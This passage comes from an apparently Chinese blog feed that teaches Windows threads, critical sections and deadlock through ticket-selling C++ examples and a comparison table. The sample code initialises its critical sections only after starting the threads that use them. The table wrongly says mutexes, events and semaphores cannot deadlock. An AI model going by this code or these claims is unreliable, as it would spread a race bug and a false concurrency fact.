cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">InitializeCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// (_WIN32_WINNT &lt; 0x0600)</span></span></span><br></pre></td></tr></table></figure><p><code>EnterCriticalSection</code>表示进入关键代码段<br>原型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">EnterCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>LeaveCriticalSection</code>用于退出关键代码段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">LeaveCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>DeleteCriticalSection</code>用于删除临界区</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">DeleteCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>总共是初始化、进入、离开、删除四个模块</p><p><strong>看起来是真的忒长了多看一眼都没有想法</strong></p><p>魔改一下卖票功能用线程实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口1卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口2卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThreadA, hThreadB;</span><br><span class="line">hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadA);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadB);</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);<span class="comment">//初始化关键代码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/20/thread1/005.png" class=""><p>因为没有了用户态的线程阻塞等待信号，两个线程的切换其实就看出没有这么频繁。或者提高线程里面的延时。</p><p>如果既没有用户态的所谓线程上锁解锁，或者现在的这个关键代码段。<br>那么多线程操作全局变量的结局就是数据重复。这个是最早的时候就提到的一个问题。</p><hr><h2 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h2><p>死锁就是指多个线程因为竞争一个资源而造成的僵局，也就是都处于等待状态。然后没有特殊处理推动，这些进程就都等在这里了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line">CRITICAL_SECTION g_ct;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区cs</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_ct);<span class="comment">//进入临界区ct</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口1卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_ct);<span class="comment">//进入临界区ct</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区cs</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口2卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThreadA, hThreadB;</span><br><span class="line">hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadA);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadB);</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);<span class="comment">//初始化关键代码cs</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_ct);<span class="comment">//初始化关键代码ct</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区cs</span></span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_ct);<span class="comment">//删除临界区ct</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里创建了两个<code>CRITICAL_SECTION</code>对象，然后在两个线程里，关键代码段都在互相等待。人为的去造成这种死锁的情况。</p><img src="/2022/07/20/thread1/006.png" class=""><p>因为两个线程都卡住了，所以就不会有显示。</p><blockquote><p>解决方法：避免这种叼毛写法。</p></blockquote><hr><h2 id="线程同步的比较小结"><a href="#线程同步的比较小结" class="headerlink" title="线程同步的比较小结"></a>线程同步的比较小结</h2><p>线程同步的方式主要有四种：</p><ol><li>互斥对象Mutex</li><li>事件对象Event</li><li>关键代码段criticalSection</li><li>信号量——偏冷</li></ol><ul><li>互斥对象和事件对象以及信号量都属于内核对象，利用内核对象进行线程同步，速度会比较慢，比较要wait之后重置。但是这样的内核对象可以在多个进程中的各个线程进行同步</li><li>关键代码段说到是在用户方式下，它的同步速度肯定快于前面几个。但使用关键代码段容易不留神造成死锁状态。最后就是关键代码段只适用于本进程中</li></ul><p>随便扯个表格,markdown格式写的，不确定会不会溢出。瞎看看吧。</p><table><thead><tr><th>差异&#x2F;对象</th><th>互斥对象Mutex</th><th>事件对象Event</th><th>信号量Semaphore</th><th>关键代码段criticalSection</th></tr></thead><tbody><tr><td>是否为内核对象</td><td>是</td><td>是</td><td>是</td><td>否</td></tr><tr><td>速度</td><td>较慢</td><td>较慢</td><td>较慢</td><td>快！</td></tr><tr><td>多个进程中的线程同步</td><td>支持</td><td>支持</td><td>支持</td><td>不支持</td></tr><tr><td>发生死锁现象</td><td>否</td><td>否</td><td>否</td><td>是</td></tr><tr><td>组成</td><td>一个线程ID；</br>用来标识哪个线程拥有该互斥量；</br>一个计数器：用来统计该线程用于互斥对象的次数</td><td>一个使用计数；</br>一个布尔值：用来标识该事件是自动重置还是人工重置；</br>一个布尔值：标识该事件处于有信号状态还是无信号状态</td><td>一个使用计数，</br>最大资源数，</br>标志当前可用资源数</td><td>一个小代码段。</br>在代码能执行钱，必须占用对某些资源的访问权</td></tr><tr><td>相关函数</td><td>CreateMutex;</br>WaitForsingleObjects;</br>ReleaseMutex</td><td>CreateEvent;</br>ResetEvent;</br>WaitforSingleobject;</br>SetEvent</td><td>CreateSemaphore;</br>WaitForsingleobject</br> ReleaseSemaPhore</td><td>InitializeCriticalSection<br/> EnterCriticalSection <br/> LeaveCriticalSection <br/> DeleteCriticalSection</td></tr><tr><td>注意事项</td><td>谁拥有互斥对象谁来释放。<br/>如果多次在同一个线程中请求同一个互斥对象，需要多次调用release函数</td><td>为了实现线程间的同步，不应该使用人工重置，应该把第二个参数设置为false;也就是自动重置</td><td>它允许多个线程在同一时间访问同一个资源，但是需要限制访问资源的最大数目。</td><td>防止死锁，使用多个关键代码段变量的时候</td></tr><tr><td>类比</td><td>一把钥匙</td><td>一个钥匙，自动和人工</td><td>停车场和保安</td><td>电话亭</td></tr></tbody></table><hr><h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p>假如你写的代码在多线程中执行和单线程中执行的结果永远完全一致，那么可以说你的代码是线程安全的。<br>就是纯纯概念</p><blockquote><p>视频推荐书籍陈硕《muduo》</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>溜溜球，保持学了跟没学的状态。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程</title>
      <link href="/2022/07/18/thread/"/>
      <url>/2022/07/18/thread/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>线程（英语：thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hhhh\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">7000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像上述代码中，我们依次延时输出，但实际走一次要花费3+5+7秒，他是一个顺序执行的过程，而有的时候更希望一个程序，能够同时进行，减少开销。</p><hr><h2 id="线程基本概念"><a href="#线程基本概念" class="headerlink" title="线程基本概念"></a>线程基本概念</h2><p>进程：是分配资源的基本单位<br>线程：是cpu调度和分配的基本单位</p><p>线程是进程中产生的一个执行单元，一个进程中往往会有多个进程并行运行。<br>抽象的说：在流水线中，进程表示车间，线程表示工人。</p><p>狭义角度，进程就是一个正在运行的程序<br>广义角度，进程是处于执行期间的程序以及它所包含的资源(如打开的文件、挂起的信号、进程状态、地址空间等)。</p><p>为什么要使用多线程</p><ul><li>避免阻塞<ul><li>单个进程只有一个主线程，当主线程阻塞的时候，整个进程也就处于阻塞状态，无法在处理其他任务</li></ul></li><li>避免cpu空转<ul><li>应用程序经常会涉及到RPC，数据库访问，磁盘IO等操作，这些操作的速度远比cpu慢，在处理这些响应的时候，cpu只能原地等待，导致单线程的程序性能低下</li></ul></li><li>提升效率<ul><li>一个进程要独立拥有4GB的虚拟地址空间，而多线程可以共享同一块地址空间，线程之间的切换要比进程之间的切换来的快。</li></ul></li></ul><h3 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h3><p>CreateThread是微软封装在windows api中提供建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过<code>CloseHandle</code>函数关闭线程对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>这是转到定义的结构，也可以在函数上按f1跳转到文档。</p><img src="/2022/07/18/thread/000.png" class=""><blockquote><p>英语不好翻译就完事。。虽然机译不一定读的通顺</p></blockquote><p>与其功能相近的还有<code>_beginthread</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uintptr_t</span> _beginthread( <span class="comment">// NATIVE CODE</span></span><br><span class="line">   <span class="built_in">void</span>( __cdecl *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="type">void</span> *arglist</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthread( <span class="comment">// MANAGED CODE</span></span><br><span class="line">   <span class="built_in">void</span>( __clrcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="type">void</span> *arglist</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthreadex( <span class="comment">// NATIVE CODE</span></span><br><span class="line">   <span class="type">void</span> *security,</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="built_in">unsigned</span> ( __stdcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">void</span> *arglist,</span><br><span class="line">   <span class="type">unsigned</span> initflag,</span><br><span class="line">   <span class="type">unsigned</span> *thrdaddr</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthreadex( <span class="comment">// MANAGED CODE</span></span><br><span class="line">   <span class="type">void</span> *security,</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="built_in">unsigned</span> ( __clrcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">void</span> *arglist,</span><br><span class="line">   <span class="type">unsigned</span> initflag,</span><br><span class="line">   <span class="type">unsigned</span> *thrdaddr</span><br><span class="line">);</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/001.png" class=""><p>使用<code>_beginthreadex</code>需包含头文件<code>&lt;process.h&gt;</code></p><p><strong>再次补充，函数名后的ex是补充拓展的意思</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printW</span><span class="params">(<span class="type">int</span> _x)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(_x*<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先把之前的封装成函数。</p><p>然后传参给<code>_beginthreadex</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>,printH,(<span class="type">void</span>*)&amp;x, <span class="number">0</span>, &amp;xId);</span><br></pre></td></tr></table></figure><p>不过会有点问题，因为传递的函数类型不太一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_In_      _beginthreadex_proc_type _StartAddress,</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">unsigned</span> <span class="params">(__stdcall* _beginthreadex_proc_type)</span><span class="params">(<span class="type">void</span>*)</span></span>;</span><br></pre></td></tr></table></figure><p>依次转到定义之后会发现，本质是一个unsinged stdcall的函数，不过形参居然要求是void*就比较蛋疼，还得转换解引用取值。。</p><p>至于__stdcall，写起来麻烦，</p><img src="/2022/07/18/thread/002.png" class=""><p>其实内置了一些宏，都可以替换，比较常见的可能是<code>WINAPI</code>，就先用着</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printH</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>额除了void都要返回值，虽然这里也不需要什么特殊的，就随便返回一个。</p><p>依次照葫芦画瓢</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 